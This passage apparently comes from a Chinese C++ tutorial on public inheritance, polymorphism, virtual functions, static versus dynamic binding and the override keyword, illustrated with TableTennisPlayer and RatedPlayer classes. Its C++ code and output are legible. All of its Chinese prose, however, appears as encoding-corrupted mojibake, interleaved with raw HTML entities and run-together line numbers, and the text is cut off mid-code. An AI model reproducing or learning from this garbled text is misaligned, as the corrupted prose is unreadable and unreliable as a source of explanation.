â€œhas-aâ€ï¼Œåº”è¯¥ä½¿ç”¨ç»„åˆï¼ˆæˆå‘˜å¯¹è±¡ï¼‰ã€‚ å¦‚æœåªæ˜¯ä¸´æ—¶ä½¿ç”¨ï¼Œåˆ™æ˜¯ â€œuses-aâ€ å…³ç³»ã€‚ ä¸æ°å½“çš„ â€œis-aâ€ ç¤ºä¾‹: å‡è®¾ä½ æƒ³åˆ›å»ºä¸€ä¸ª Square ç±»å’Œä¸€ä¸ª Rectangle ç±»ã€‚ä½ å¯èƒ½ä¼šæƒ³è®© Square ç»§æ‰¿è‡ª Rectangleï¼Œå› ä¸ºæ­£æ–¹å½¢â€œæ˜¯â€çŸ©å½¢ã€‚ä½†è¿™é‡Œå­˜åœ¨é—®é¢˜ï¼šå¦‚æœ Rectangle æœ‰ setWidth() å’Œ setHeight() æ–¹æ³•ï¼Œå¹¶ä¸”å®ƒä»¬å¯ä»¥ç‹¬ç«‹è®¾ç½®å®½é«˜ï¼Œé‚£ä¹ˆå½“ä½ åœ¨ä¸€ä¸ªè¢«è§†ä¸º Rectangle çš„ Square å¯¹è±¡ä¸Šè°ƒç”¨ setWidth() æ—¶ï¼Œä¸ºäº†ä¿æŒæ­£æ–¹å½¢çš„æ€§è´¨ï¼Œä½ å¯èƒ½éœ€è¦åŒæ—¶ä¿®æ”¹é«˜åº¦ï¼Œè¿™è¿åäº† Rectangle çš„è¡Œä¸ºé¢„æœŸï¼ˆå®½åº¦å’Œé«˜åº¦å¯ä»¥ç‹¬ç«‹è®¾ç½®ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå…¬æœ‰ç»§æ‰¿å¯èƒ½ä¸æ˜¯æœ€ä½³é€‰æ‹©ï¼Œå¯èƒ½éœ€è¦é‡æ–°è€ƒè™‘è®¾è®¡æˆ–ä½¿ç”¨å…¶ä»–ç»§æ‰¿æ–¹å¼ã€‚ æ€»ç»“: å…¬æœ‰ç»§æ‰¿ (public) å»ºç«‹äº†ä¸€ç§ â€œis-aâ€ å…³ç³»ï¼Œè¡¨ç¤ºæ´¾ç”Ÿç±»æ˜¯åŸºç±»çš„ä¸€ç§ç‰¹æ®Šç±»å‹ã€‚ â€œis-aâ€ å…³ç³»çš„æ ¸å¿ƒæ˜¯æ´¾ç”Ÿç±»ç»§æ‰¿äº†åŸºç±»çš„å…¬æœ‰æ¥å£ï¼Œå› æ­¤å¯ä»¥åƒåŸºç±»å¯¹è±¡ä¸€æ ·è¢«ä½¿ç”¨ã€‚ è¿™ä½“ç°åœ¨åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨å¯ä»¥æŒ‡å‘æˆ–å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡ã€‚ åº”å°†å…¬æœ‰ç»§æ‰¿ä¸ â€œhas-aâ€ï¼ˆç»„åˆï¼‰å’Œ â€œuses-aâ€ï¼ˆå…³è”ï¼‰å…³ç³»åŒºåˆ†å¼€ã€‚ åªæœ‰åœ¨æ´¾ç”Ÿç±»ç¡®å®ç¬¦åˆåŸºç±»çš„è¡Œä¸ºå¥‘çº¦æ—¶ï¼Œæ‰åº”ä½¿ç”¨å…¬æœ‰ç»§æ‰¿ã€‚ 13.3 å¤šæ€å…¬æœ‰ç»§æ‰¿æˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œå…¬æœ‰ç»§æ‰¿å»ºç«‹äº† â€œis-aâ€ å…³ç³»ï¼Œå…è®¸æˆ‘ä»¬ä½¿ç”¨åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨æ¥æŒ‡å‘æˆ–å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡ã€‚ä¾‹å¦‚ï¼š 12RatedPlayer rp(&quot;May&quot;, &quot;Lee&quot;, true, 1500);TableTennisPlayer * pt = &amp;rp; // åŸºç±»æŒ‡é’ˆæŒ‡å‘æ´¾ç”Ÿç±»å¯¹è±¡ ç„¶è€Œï¼Œå½“æˆ‘ä»¬é€šè¿‡åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨è°ƒç”¨ä¸€ä¸ªåŒæ—¶å­˜åœ¨äºåŸºç±»å’Œæ´¾ç”Ÿç±»ä¸­çš„æ–¹æ³•æ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿ 1pt-&gt;Name(); // è°ƒç”¨å“ªä¸ª Name() æ–¹æ³•ï¼Ÿ TableTennisPlayer::Name() è¿˜æ˜¯ RatedPlayer::Name()ï¼Ÿ åœ¨æ²¡æœ‰ç‰¹æ®Šå¤„ç†çš„æƒ…å†µä¸‹ï¼ŒC++ é»˜è®¤ä½¿ç”¨é™æ€è”ç¼– (Static Binding) æˆ–æ—©ç»‘å®š (Early Binding)**ã€‚è¿™æ„å‘³ç€ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶æ ¹æ®æŒ‡é’ˆæˆ–å¼•ç”¨çš„é™æ€ç±»å‹**ï¼ˆå£°æ˜çš„ç±»å‹ï¼Œè¿™é‡Œæ˜¯ TableTennisPlayer*ï¼‰æ¥å†³å®šè°ƒç”¨å“ªä¸ªç‰ˆæœ¬çš„æ–¹æ³•ã€‚å› æ­¤ï¼Œå³ä½¿ pt å®é™…æŒ‡å‘ä¸€ä¸ª RatedPlayer å¯¹è±¡ï¼Œpt-&gt;Name() ä¹Ÿä¼šè°ƒç”¨ TableTennisPlayer::Name()ã€‚ è¿™é€šå¸¸ä¸æ˜¯æˆ‘ä»¬æœŸæœ›çš„è¡Œä¸ºï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†ä¸åŒç±»å‹çš„æ´¾ç”Ÿç±»å¯¹è±¡æ—¶ã€‚æˆ‘ä»¬å¸Œæœ›ç¨‹åºèƒ½å¤Ÿåœ¨è¿è¡Œæ—¶æ ¹æ®æŒ‡é’ˆæˆ–å¼•ç”¨å®é™…æŒ‡å‘çš„å¯¹è±¡ç±»å‹æ¥é€‰æ‹©è°ƒç”¨ç›¸åº”çš„æ–¹æ³•ã€‚è¿™ç§â€œå¤šç§å½¢æ€â€çš„è¡Œä¸ºå°±æ˜¯**å¤šæ€ (Polymorphism)**ã€‚ å¤šæ€æ˜¯é¢å‘å¯¹è±¡ç¼–ç¨‹çš„ä¸‰å¤§æ”¯æŸ±ä¹‹ä¸€ï¼ˆå¦å¤–ä¸¤ä¸ªæ˜¯å°è£…å’Œç»§æ‰¿ï¼‰ã€‚å®ƒå…è®¸æˆ‘ä»¬ä»¥ç»Ÿä¸€çš„æ–¹å¼ï¼ˆé€šè¿‡åŸºç±»æ¥å£ï¼‰å¤„ç†ä¸åŒç±»å‹çš„å¯¹è±¡ï¼Œè€Œè¿™äº›å¯¹è±¡å„è‡ªä»¥è‡ªå·±çš„æ–¹å¼å“åº”ç›¸åŒçš„æ¶ˆæ¯ï¼ˆæ–¹æ³•è°ƒç”¨ï¼‰ã€‚ å¦‚ä½•å®ç°å¤šæ€ï¼Ÿ C++ é€šè¿‡ä½¿ç”¨è™šå‡½æ•° (Virtual Functions) å’ŒåŠ¨æ€è”ç¼– (Dynamic Binding) æˆ–æ™šç»‘å®š (Late Binding) æ¥å®ç°å¤šæ€ã€‚ è™šå‡½æ•° (Virtual Functions): è¦åœ¨æ´¾ç”Ÿç±»ä¸­é‡æ–°å®šä¹‰ï¼ˆè¦†ç›–ï¼‰åŸºç±»çš„æ–¹æ³•ï¼Œå¹¶ä¸”å¸Œæœ›é€šè¿‡åŸºç±»æŒ‡é’ˆ/å¼•ç”¨è°ƒç”¨æ—¶èƒ½å¤Ÿæ‰§è¡Œæ´¾ç”Ÿç±»çš„ç‰ˆæœ¬ï¼Œå°±å¿…é¡»åœ¨åŸºç±»ä¸­å°†è¯¥æ–¹æ³•å£°æ˜ä¸ºè™šå‡½æ•°ã€‚ é€šè¿‡åœ¨åŸºç±»æ–¹æ³•å£°æ˜å‰åŠ ä¸Š virtual å…³é”®å­—æ¥å®ç°ã€‚ ä¿®æ”¹ TableTennisPlayer (tabtenn1.h) è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°ç‰ˆæœ¬çš„å¤´æ–‡ä»¶ tabtenn1.hï¼Œåœ¨å…¶ä¸­å°† Name() æ–¹æ³•å£°æ˜ä¸ºè™šå‡½æ•°ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940#ifndef TABTENN1_H_#define TABTENN1_H_#include &lt;string&gt;#include &lt;iostream&gt; // æ·»åŠ  iostream ä»¥ä¾¿åœ¨å¤´æ–‡ä»¶ä¸­ä½¿ç”¨ cout (è™½ç„¶é€šå¸¸ä¸æ¨è)// åŸºç±» - ä½¿ç”¨è™šå‡½æ•°class TableTennisPlayer &#123;private: std::string firstname; std::string lastname; bool hasTable;public: TableTennisPlayer (const std::string &amp; fn = &quot;none&quot;, const std::string &amp; ln = &quot;none&quot;, bool ht = false); // å°† Name() å£°æ˜ä¸ºè™šå‡½æ•° virtual void Name() const; bool HasTable() const &#123; return hasTable; &#125;; void ResetTable(bool v) &#123; hasTable = v; &#125;; // æ·»åŠ ä¸€ä¸ªè™šææ„å‡½æ•°é€šå¸¸æ˜¯å¥½ä¹ æƒ¯ (ç¨åè§£é‡Š) virtual ~TableTennisPlayer() &#123; &#125;&#125;;// æ´¾ç”Ÿç±»class RatedPlayer : public TableTennisPlayer &#123;private: unsigned int rating;public: RatedPlayer (unsigned int r = 0, const std::string &amp; fn = &quot;none&quot;, const std::string &amp; ln = &quot;none&quot;, bool ht = false); RatedPlayer(unsigned int r, const TableTennisPlayer &amp; tp); unsigned int Rating() const &#123; return rating; &#125; void ResetRating (unsigned int r) &#123; rating = r; &#125; // è¦†ç›–åŸºç±»çš„è™šå‡½æ•° Name() // C++11 æ¨èä½¿ç”¨ override å…³é”®å­—æ˜ç¡®è¡¨ç¤ºè¦†ç›– virtual void Name() const override; // ä¹Ÿå¯ä»¥åªå†™ virtual void Name() const; // æˆ– void Name() const; (å¦‚æœåŸºç±»æ˜¯ virtualï¼Œæ´¾ç”Ÿç±»åŒååŒå‚æ–¹æ³•è‡ªåŠ¨ä¹Ÿæ˜¯ virtual)&#125;;#endif // TABTENN1_H_ ä¿®æ”¹å®ç° (tabtenn1.cpp) æˆ‘ä»¬éœ€è¦æä¾› RatedPlayer::Name() çš„å®ç°ï¼Œå¹¶æ›´æ–°æ„é€ å‡½æ•°ä»¥åŒ¹é…æ–°çš„ç±»åã€‚ 1234567891011121314151617181920212223242526272829#include &quot;tabtenn1.h&quot;#include &lt;iostream&gt;// TableTennisPlayer æ–¹æ³•TableTennisPlayer::TableTennisPlayer (const std::string &amp; fn, const std::string &amp; ln, bool ht) : firstname(fn), lastname(ln), hasTable(ht) &#123;&#125;void TableTennisPlayer::Name() const &#123; std::cout &lt;&lt; lastname &lt;&lt; &quot;, &quot; &lt;&lt; firstname;&#125;// RatedPlayer æ–¹æ³•RatedPlayer::RatedPlayer(unsigned int r, const std::string &amp; fn, const std::string &amp; ln, bool ht) : TableTennisPlayer(fn, ln, ht), rating(r) &#123;&#125;RatedPlayer::RatedPlayer(unsigned int r, const TableTennisPlayer &amp; tp) : TableTennisPlayer(tp), rating(r) &#123;&#125;// RatedPlayer è¦†ç›–çš„ Name() æ–¹æ³•å®ç°void RatedPlayer::Name() const &#123; // å¯ä»¥è°ƒç”¨åŸºç±»çš„ Name() æ–¹æ³• TableTennisPlayer::Name(); // æ·»åŠ è‡ªå·±çš„è¾“å‡º std::cout &lt;&lt; &quot;, Rating: &quot; &lt;&lt; rating;&#125; åŠ¨æ€è”ç¼– (Dynamic Binding): å½“é€šè¿‡åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨è°ƒç”¨ä¸€ä¸ªè™šå‡½æ•°æ—¶ï¼Œç¨‹åºä¼šæ ¹æ®æŒ‡é’ˆæˆ–å¼•ç”¨å®é™…æŒ‡å‘çš„å¯¹è±¡ç±»å‹æ¥å†³å®šè°ƒç”¨å“ªä¸ªç‰ˆæœ¬çš„æ–¹æ³•ã€‚è¿™ä¸ªå†³å®šæ˜¯åœ¨è¿è¡Œæ—¶åšå‡ºçš„ï¼Œå› æ­¤ç§°ä¸ºåŠ¨æ€è”ç¼–æˆ–æ™šç»‘å®šã€‚ ä½¿ç”¨ç¤ºä¾‹ (usett1.cpp) 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &quot;tabtenn1.h&quot; // ä½¿ç”¨åŒ…å«è™šå‡½æ•°çš„æ–°ç‰ˆæœ¬int main ( void ) &#123; using std::cout; using std::endl; TableTennisPlayer player1(&quot;Tara&quot;, &quot;Boomdea&quot;, false); RatedPlayer rplayer1(1140, &quot;Mallory&quot;, &quot;Duck&quot;, true); // é€šè¿‡å¯¹è±¡ç›´æ¥è°ƒç”¨ï¼Œæ€»æ˜¯è°ƒç”¨å¯¹è±¡æ‰€å±ç±»çš„æ–¹æ³• (é™æ€è”ç¼–) cout &lt;&lt; &quot;Direct call:\\n&quot;; player1.Name(); cout &lt;&lt; endl; // è°ƒç”¨ TableTennisPlayer::Name() rplayer1.Name(); cout &lt;&lt; endl; // è°ƒç”¨ RatedPlayer::Name() // é€šè¿‡æŒ‡é’ˆè°ƒç”¨è™šå‡½æ•° (åŠ¨æ€è”ç¼–) cout &lt;&lt; &quot;\\nUsing pointers to base type:\\n&quot;; TableTennisPlayer * pt1 = &amp;player1; TableTennisPlayer * pt2 = &amp;rplayer1; pt1-&gt;Name(); cout &lt;&lt; endl; // pt1 æŒ‡å‘ TableTennisPlayer å¯¹è±¡ï¼Œè°ƒç”¨ TableTennisPlayer::Name() pt2-&gt;Name(); cout &lt;&lt; endl; // *** pt2 æŒ‡å‘ RatedPlayer å¯¹è±¡ï¼Œè°ƒç”¨ RatedPlayer::Name() *** // é€šè¿‡å¼•ç”¨è°ƒç”¨è™šå‡½æ•° (åŠ¨æ€è”ç¼–) cout &lt;&lt; &quot;\\nUsing references to base type:\\n&quot;; TableTennisPlayer &amp; rt1 = player1; TableTennisPlayer &amp; rt2 = rplayer1; rt1.Name(); cout &lt;&lt; endl; // rt1 å¼•ç”¨ TableTennisPlayer å¯¹è±¡ï¼Œè°ƒç”¨ TableTennisPlayer::Name() rt2.Name(); cout &lt;&lt; endl; // *** rt2 å¼•ç”¨ RatedPlayer å¯¹è±¡ï¼Œè°ƒç”¨ RatedPlayer::Name() *** return 0;&#125; ç¼–è¯‘å’Œè¿è¡Œ: 12g++ usett1.cpp tabtenn1.cpp -o usett1./usett1 è¾“å‡º: 1234567891011Direct call:Boomdea, TaraDuck, Mallory, Rating: 1140Using pointers to base type:Boomdea, TaraDuck, Mallory, Rating: 1140Using references to base type:Boomdea, TaraDuck, Mallory, Rating: 1140 å¯ä»¥çœ‹åˆ°ï¼Œå½“é€šè¿‡åŸºç±»æŒ‡é’ˆ pt2 æˆ–åŸºç±»å¼•ç”¨ rt2 è°ƒç”¨è™šå‡½æ•° Name() æ—¶ï¼Œç¨‹åºåœ¨è¿è¡Œæ—¶æ£€æŸ¥åˆ°å®ƒä»¬å®é™…æŒ‡å‘/å¼•ç”¨çš„æ˜¯ RatedPlayer å¯¹è±¡ï¼Œå› æ­¤è°ƒç”¨äº† RatedPlayer::Name() ç‰ˆæœ¬ï¼Œå®ç°äº†å¤šæ€è¡Œä¸ºã€‚ ä¸ºä»€ä¹ˆéœ€è¦å¤šæ€ï¼Ÿ å¤šæ€å…è®¸æˆ‘ä»¬ç¼–å†™æ›´é€šç”¨ã€æ›´çµæ´»çš„ä»£ç ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œæ¥å—ä¸€ä¸ª TableTennisPlayer çš„æŒ‡é’ˆæˆ–å¼•ç”¨æ•°ç»„ï¼Œç„¶åéå†è¿™ä¸ªæ•°ç»„ï¼Œå¯¹æ¯ä¸ªå…ƒç´ è°ƒç”¨ Name() æ–¹æ³•ã€‚å³ä½¿æ•°ç»„ä¸­åŒ…å«ä¸åŒç±»å‹çš„çƒå‘˜ï¼ˆTableTennisPlayer, RatedPlayer æˆ–å…¶ä»–æ´¾ç”Ÿç±»ï¼‰ï¼Œåªè¦ Name() æ˜¯è™šå‡½æ•°ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½ä¼šä»¥è‡ªå·±æ­£ç¡®çš„æ–¹å¼æ˜¾ç¤ºå…¶åç§°å’Œä¿¡æ¯ã€‚ 12345678void ShowPlayerInfo(const TableTennisPlayer &amp; player) &#123; player.Name(); // ä¼šæ ¹æ® player å®é™…ç±»å‹è°ƒç”¨æ­£ç¡®çš„ Name() ç‰ˆæœ¬ cout &lt;&lt; endl;&#125;// ... in main ...ShowPlayerInfo(player1);ShowPlayerInfo(rplayer1); æ€»ç»“: å¤šæ€å…è®¸ä»¥ç»Ÿä¸€çš„æ–¹å¼å¤„ç†ä¸åŒç±»å‹çš„å¯¹è±¡ã€‚ C++ é€šè¿‡å…¬æœ‰ç»§æ‰¿ã€è™šå‡½æ•° (virtual) å’ŒåŠ¨æ€è”ç¼–æ¥å®ç°å¤šæ€ã€‚ åœ¨åŸºç±»ä¸­å°†å¸Œæœ›åœ¨æ´¾ç”Ÿç±»ä¸­é‡æ–°å®šä¹‰å¹¶å¸Œæœ›é€šè¿‡åŸºç±»æŒ‡é’ˆ/å¼•ç”¨è°ƒç”¨çš„æ–¹æ³•å£°æ˜ä¸º virtualã€‚ å½“é€šè¿‡åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨è°ƒç”¨è™šå‡½æ•°æ—¶ï¼Œç¨‹åºåœ¨è¿è¡Œæ—¶æ ¹æ®å¯¹è±¡çš„å®é™…ç±»å‹ç¡®å®šè¦è°ƒç”¨çš„æ–¹æ³•ç‰ˆæœ¬ï¼ˆåŠ¨æ€è”ç¼–ï¼‰ã€‚ å¦‚æœæœªä½¿ç”¨ virtualï¼Œåˆ™æ ¹æ®æŒ‡é’ˆ/å¼•ç”¨çš„å£°æ˜ç±»å‹åœ¨ç¼–è¯‘æ—¶ç¡®å®šè°ƒç”¨ç‰ˆæœ¬ï¼ˆé™æ€è”ç¼–ï¼‰ã€‚ å¤šæ€æ˜¯å®ç°ä»£ç çµæ´»æ€§å’Œå¯æ‰©å±•æ€§çš„å…³é”® OOP æŠ€æœ¯ã€‚ 13.4 é™æ€è”ç¼–å’ŒåŠ¨æ€è”ç¼–è”ç¼– (Binding) æŒ‡çš„æ˜¯å°†æºä»£ç ä¸­çš„å‡½æ•°è°ƒç”¨ï¼ˆæˆ–æ–¹æ³•è°ƒç”¨ï¼‰ä¸å…¶åœ¨å¯æ‰§è¡Œä»£ç ä¸­çš„å…·ä½“å®ç°ï¼ˆå‡½æ•°ä½“ï¼‰å…³è”èµ·æ¥çš„è¿‡ç¨‹ã€‚C++ æ”¯æŒä¸¤ç§ç±»å‹çš„è”ç¼–ï¼šé™æ€è”ç¼–å’ŒåŠ¨æ€è”ç¼–ã€‚ç†è§£å®ƒä»¬çš„åŒºåˆ«å¯¹äºæŒæ¡å¤šæ€è‡³å…³é‡è¦ã€‚ 13.4.1 æŒ‡é’ˆå’Œå¼•ç”¨ç±»å‹çš„å…¼å®¹æ€§æˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œåœ¨å…¬æœ‰ç»§æ‰¿ä¸‹ï¼ŒåŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨å¯ä»¥æŒ‡å‘æˆ–å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡ã€‚è¿™æ˜¯å®ç°å¤šæ€çš„å‰æã€‚ 1234// å‡è®¾ RatedPlayer å…¬æœ‰ç»§æ‰¿è‡ª TableTennisPlayerRatedPlayer rp;TableTennisPlayer * pt = &amp;rp; // OKTableTennisPlayer &amp; rt = rp; // OK è¿™ç§å‘ä¸Šè½¬æ¢ï¼ˆå°†æ´¾ç”Ÿç±»æŒ‡é’ˆ/å¼•ç”¨è½¬æ¢ä¸ºåŸºç±»æŒ‡é’ˆ/å¼•ç”¨ï¼‰æ˜¯è‡ªåŠ¨ä¸”å®‰å…¨çš„ï¼Œå› ä¸ºæ´¾ç”Ÿç±»å¯¹è±¡ä¿è¯åŒ…å«äº†åŸºç±»çš„æ‰€æœ‰æˆå‘˜å’Œæ¥å£ã€‚ åè¿‡æ¥ï¼Œå°†åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨è½¬æ¢ä¸ºæ´¾ç”Ÿç±»æŒ‡é’ˆæˆ–å¼•ç”¨ï¼ˆå‘ä¸‹è½¬æ¢ï¼‰é€šå¸¸æ˜¯ä¸å®‰å…¨çš„ï¼Œéœ€è¦æ˜¾å¼ç±»å‹è½¬æ¢ï¼ˆå¦‚ dynamic_castï¼Œå°†åœ¨åé¢ç« èŠ‚è®¨è®ºï¼‰ï¼Œå¹¶ä¸”åªæœ‰åœ¨æŒ‡é’ˆ/å¼•ç”¨ç¡®å®æŒ‡å‘ä¸€ä¸ªæ´¾ç”Ÿç±»å¯¹è±¡æ—¶æ‰æœ‰æ•ˆã€‚ 13.4.2 è™šæˆå‘˜å‡½æ•°å’ŒåŠ¨æ€è”ç¼–ç°åœ¨è€ƒè™‘é€šè¿‡åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨è°ƒç”¨æˆå‘˜å‡½æ•°ï¼š 12pt-&gt;SomeMethod();rt.SomeMethod(); ç¼–è¯‘å™¨å¦‚ä½•å†³å®šè°ƒç”¨å“ªä¸ª SomeMethod çš„å®ç°ï¼ˆåŸºç±»çš„è¿˜æ˜¯æ´¾ç”Ÿç±»çš„ï¼‰ï¼Ÿè¿™å–å†³äº SomeMethod æ˜¯å¦æ˜¯è™šå‡½æ•°ä»¥åŠè”ç¼–æ–¹å¼ã€‚ é™æ€è”ç¼– (Static Binding / Early Binding): ä½•æ—¶å‘ç”Ÿ: å½“è°ƒç”¨çš„å‡½æ•°ä¸æ˜¯è™šå‡½æ•°æ—¶ï¼Œæˆ–è€…å½“é€šè¿‡å¯¹è±¡æœ¬èº«ï¼ˆè€Œä¸æ˜¯æŒ‡é’ˆæˆ–å¼•ç”¨ï¼‰è°ƒç”¨å‡½æ•°æ—¶ï¼ˆæ— è®ºæ˜¯è™šå‡½æ•°è¿˜æ˜¯éè™šå‡½æ•°ï¼‰ã€‚ å†³ç­–ä¾æ®: ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶æ ¹æ®æŒ‡é’ˆæˆ–å¼•ç”¨çš„å£°æ˜ç±»å‹ï¼ˆé™æ€ç±»å‹ï¼‰æ¥å†³å®šè°ƒç”¨å“ªä¸ªå‡½æ•°ç‰ˆæœ¬ã€‚ è¡Œä¸º: å³ä½¿åŸºç±»æŒ‡é’ˆ pt æŒ‡å‘ä¸€ä¸ªæ´¾ç”Ÿç±»å¯¹è±¡ rpï¼Œå¦‚æœ SomeMethod ä¸æ˜¯è™šå‡½æ•°ï¼Œpt-&gt;SomeMethod() ä»ç„¶ä¼šè°ƒç”¨åŸºç±»çš„ SomeMethod ç‰ˆæœ¬ã€‚ æ•ˆç‡: é™æ€è”ç¼–æ•ˆç‡è¾ƒé«˜ï¼Œå› ä¸ºåœ¨ç¼–è¯‘æ—¶å°±å·²ç»ç¡®å®šäº†è¦è°ƒç”¨çš„å‡½æ•°åœ°å€ã€‚ åŠ¨æ€è”ç¼– (Dynamic Binding / Late Binding): ä½•æ—¶å‘ç”Ÿ: å½“é€šè¿‡åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨è°ƒç”¨ä¸€ä¸ªè™šå‡½æ•° (virtual) æ—¶ã€‚ å†³ç­–ä¾æ®: ç¨‹åºåœ¨è¿è¡Œæ—¶æ£€æŸ¥æŒ‡é’ˆæˆ–å¼•ç”¨å®é™…æŒ‡å‘çš„å¯¹è±¡ç±»å‹ï¼Œå¹¶è°ƒç”¨è¯¥å¯¹è±¡æ‰€å±ç±»çš„ç›¸åº”è™šå‡½æ•°ç‰ˆæœ¬ã€‚ è¡Œä¸º: å¦‚æœåŸºç±»æŒ‡é’ˆ pt æŒ‡å‘ä¸€ä¸ªæ´¾ç”Ÿç±»å¯¹è±¡ rpï¼Œå¹¶ä¸” SomeMethod æ˜¯è™šå‡½æ•°ï¼Œpt-&gt;SomeMethod() ä¼šè°ƒç”¨æ´¾ç”Ÿç±»çš„ SomeMethod ç‰ˆæœ¬ã€‚è¿™å°±æ˜¯å¤šæ€çš„æ ¸å¿ƒã€‚ å®ç°æœºåˆ¶ (æ¦‚å¿µä¸Š): ç¼–è¯‘å™¨é€šå¸¸ä¸ºåŒ…å«è™šå‡½æ•°çš„ç±»åˆ›å»ºä¸€ä¸ª**è™šå‡½æ•°è¡¨ (virtual function table, vtable)**ã€‚vtable æ˜¯ä¸€ä¸ªå­˜å‚¨è™šå‡½æ•°åœ°å€çš„æ•°ç»„ã€‚æ¯ä¸ªåŒ…å«è™šå‡½æ•°çš„ç±»çš„å¯¹è±¡å†…éƒ¨éƒ½æœ‰ä¸€ä¸ªéšè—çš„æŒ‡é’ˆï¼ˆé€šå¸¸ç§°ä¸º vptrï¼‰ï¼ŒæŒ‡å‘å…¶ç±»çš„ vtableã€‚å½“é€šè¿‡åŸºç±»æŒ‡é’ˆè°ƒç”¨è™šå‡½æ•°æ—¶ï¼Œç¨‹åºé€šè¿‡å¯¹è±¡çš„ vptr æ‰¾åˆ° vtableï¼Œç„¶ååœ¨ vtable ä¸­æŸ¥æ‰¾å¹¶è°ƒç”¨æ­£ç¡®çš„å‡½æ•°åœ°å€ã€‚è¿™ä¸ªæŸ¥æ‰¾è¿‡ç¨‹å‘ç”Ÿåœ¨è¿è¡Œæ—¶ã€‚ æ•ˆç‡: åŠ¨æ€è”ç¼–æ¯”é™æ€è”ç¼–æœ‰è½»å¾®çš„è¿è¡Œæ—¶å¼€é”€ï¼ˆéœ€è¦æŸ¥æ‰¾ vtableï¼‰ï¼Œä½†åœ¨ç°ä»£å¤„ç†å™¨ä¸Šè¿™ç§å¼€é”€é€šå¸¸å¾ˆå°ï¼Œè€Œå®ƒå¸¦æ¥çš„çµæ´»æ€§æ˜¯å·¨å¤§çš„ã€‚ æ€»ç»“å¯¹æ¯”: ç‰¹æ€§ é™æ€è”ç¼– (Static Binding) åŠ¨æ€è”ç¼– (Dynamic Binding) å‘ç”Ÿæ—¶é—´ ç¼–è¯‘æ—¶ è¿è¡Œæ—¶ è§¦å‘æ¡ä»¶ è°ƒç”¨éè™šå‡½æ•°ï¼Œæˆ–é€šè¿‡å¯¹è±¡è°ƒç”¨ä»»ä½•å‡½æ•° é€šè¿‡åŸºç±»æŒ‡é’ˆ/å¼•ç”¨è°ƒç”¨è™šå‡½æ•° å†³ç­–ä¾æ® æŒ‡é’ˆ/å¼•ç”¨çš„å£°æ˜ç±»å‹ (é™æ€ç±»å‹) æŒ‡é’ˆ/å¼•ç”¨å®é™…æŒ‡å‘çš„å¯¹è±¡ç±»å‹ (åŠ¨æ€ç±»å‹) è¡Œä¸º è°ƒç”¨å£°æ˜ç±»å‹çš„å‡½æ•°ç‰ˆæœ¬ è°ƒç”¨å®é™…å¯¹è±¡ç±»å‹çš„å‡½æ•°ç‰ˆæœ¬ (å¤šæ€) æœºåˆ¶ ç›´æ¥å‡½æ•°è°ƒç”¨ é€šå¸¸é€šè¿‡è™šå‡½æ•°è¡¨ (vtable) å®ç° æ•ˆç‡ è¾ƒé«˜ ç•¥ä½äºé™æ€è”ç¼–ï¼Œä½†é€šå¸¸å¯æ¥å— 13.4.3 æœ‰å…³è™šå‡½æ•°æ³¨æ„äº‹é¡¹ä¸ºäº†æ­£ç¡®ä½¿ç”¨è™šå‡½æ•°å’ŒåŠ¨æ€è”ç¼–ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š åœ¨åŸºç±»ä¸­å£°æ˜ virtual: å¿…é¡»åœ¨åŸºç±»ä¸­å°†å¸Œæœ›è¡¨ç°å‡ºå¤šæ€è¡Œä¸ºçš„å‡½æ•°å£°æ˜ä¸º virtualã€‚ æ´¾ç”Ÿç±»è¦†ç›–: å¦‚æœæ´¾ç”Ÿç±»æä¾›äº†åŒåã€åŒå‚æ•°åˆ—è¡¨ï¼ˆåŒ…æ‹¬ const å±æ€§ï¼‰çš„æ–¹æ³•ï¼Œå®ƒå°†è‡ªåŠ¨è¦†ç›–ï¼ˆoverrideï¼‰åŸºç±»çš„è™šå‡½æ•°ã€‚è¿™ä¸ªæ´¾ç”Ÿç±»æ–¹æ³•ä¹Ÿè‡ªåŠ¨æˆä¸ºè™šå‡½æ•°ï¼Œæ— è®ºæ˜¯å¦æ˜¾å¼ä½¿ç”¨äº† virtual å…³é”®å­—ã€‚ override å…³é”®å­— (C++11): å¼ºçƒˆå»ºè®®åœ¨æ´¾ç”Ÿç±»è¦†ç›–è™šå‡½æ•°æ—¶ä½¿ç”¨ override å…³é”®å­—ã€‚è¿™ä¼šè®©ç¼–è¯‘å™¨æ£€æŸ¥è¯¥æ–¹æ³•æ˜¯å¦ç¡®å®è¦†ç›–äº†åŸºç±»ä¸­çš„æŸä¸ªè™šå‡½æ•°ã€‚å¦‚æœç­¾åä¸åŒ¹é…ï¼ˆä¾‹å¦‚ï¼Œå‚æ•°ç±»å‹ä¸åŒæˆ– const å±æ€§ä¸åŒï¼‰ï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ï¼Œå¸®åŠ©æ•è·æ½œåœ¨é”™è¯¯ã€‚ 12345678910class Base &#123;public: virtual void func(int) const;&#125;;class Derived : public Base &#123;public: // virtual void func(int) override; // é”™è¯¯ï¼const å±æ€§ä¸åŒ¹é… virtual void 